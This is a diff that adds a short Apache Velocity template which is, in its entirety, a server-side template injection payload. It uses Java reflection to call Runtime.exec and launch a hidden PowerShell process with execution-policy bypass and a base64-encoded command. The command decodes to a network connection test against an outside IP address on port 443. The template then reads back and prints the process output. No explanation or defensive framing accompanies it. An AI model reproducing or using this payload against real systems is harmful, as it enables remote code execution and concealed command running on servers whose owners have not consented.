@@ -1,0 +1,10 @@
+#set ($e="exp")
+#set ($abcdef="powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc VABlAHMAdAAtAE4AZQB0AEMAbwBuAG4AZQBjAHQAaQBvAG4AIAAxADQANQAuADIANAA5AC4AMQAwADcALgAyADMANwAgAC0AUABvAHIAdAAgADQANAAzAA==")
+#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($abcdef))
+#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
+#set($sc = $e.getClass().forName("java.util.Scanner"))
+#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
+#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
+#if($scan.hasNextByte())
+    $scan.nextByte()
+#end
